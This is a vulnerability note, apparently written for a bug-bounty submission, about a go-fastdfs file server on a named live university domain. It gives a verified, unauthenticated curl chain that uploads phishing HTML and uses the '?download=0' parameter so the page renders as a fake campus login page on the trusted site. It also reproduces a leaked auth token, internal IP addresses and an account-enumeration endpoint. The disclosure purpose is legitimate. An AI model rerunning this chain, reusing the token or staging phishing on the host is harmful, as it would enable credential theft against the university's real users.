# bzuu.edu.cn go-fastdfs Phishing via ?download=0 (2026-05-27)

## Critical Discovery

go-fastdfs's `?download=0` parameter changes Content-Type from `application/octet-stream` to the file's actual MIME type. For `.html` files, this means `text/html; charset=utf-8` — the browser renders the page.

## Verified Attack Chain (all unauthenticated)

```bash
# Step 1: Upload phishing HTML
curl -sk -X POST "https://oshall.bzuu.edu.cn/fileServer/upload?output=json2&scene=default" \
  -F "file=@phishing.html;filename=phishing.html"
# Returns: {"data":{"path":"/default/20260527/10/36/8/phishing.html","status":"ok"}}

# Step 2: Verify HTML rendering
curl -sk -I "https://oshall.bzuu.edu.cn/fileServer/default/20260527/10/36/8/phishing.html?download=0"
# Content-Type: text/html; charset=utf-8

# Step 3: Browser renders phishing page on trusted domain
# URL: https://oshall.bzuu.edu.cn/fileServer/default/20260527/10/36/8/phishing.html?download=0
# Title: "亳州学院统一身份认证"
```

## Evidence Collected

- Upload response: `/tmp/vuln_reports/bzuu/upload_response_body.json`
- HTML render headers: `/tmp/vuln_reports/bzuu/html_render_headers.txt`
- CORS headers: `/tmp/vuln_reports/bzuu/cors_headers.txt` (ACAO: *)
- Status response: `/tmp/vuln_reports/bzuu/status_response.json`
- Browser screenshot: `/tmp/vuln_reports/bzuu/phishing_page_screenshot.png`
- Full report: `/tmp/vuln_reports/bzuu/bzuu-gofastdfs-phishing-report.txt`

## Additional Findings

1. `/fileServer/status` — leaks internal IP `10.10.36.161:8080`, disk/mem/CPU, 23599 files (15.4GB total)
2. `/fileServer/static/uppy.html` — leaks `auth_token: 9ee60e59-cb0f-4578-aaba-29b9fc2919ca`
3. Admin endpoints (`/fileServer/stat`, `/fileServer/reload`, etc.) — leak reverse proxy IP `10.10.30.108`
4. CORS: `Access-Control-Allow-Origin: *` on all endpoints
5. No DMARC/SPF records for bzuu.edu.cn (email spoofing risk)

## jyxt.bzuu.edu.cn Account Enumeration (Low Value)

ASP.NET login at `/Account/Login/SendSmsCode` returns `"手机号码或姓名不存在！"` for non-existent accounts. Password reset endpoint exists at `/Account/Login/UpdateNewPassWord` but requires SMS code first. Not enough evidence for standalone report without demonstrating response difference for existing accounts.

## Relationship to Prior Reports

The 2026-05-18 report angle was "未授权访问致服务器信息泄露" (info disclosure). The 2026-05-27 finding (`?download=0` enabling HTML rendering) is a **distinct, higher-severity vulnerability** — phishing on a trusted educational domain. This should be submitted as a new finding, not a duplicate.
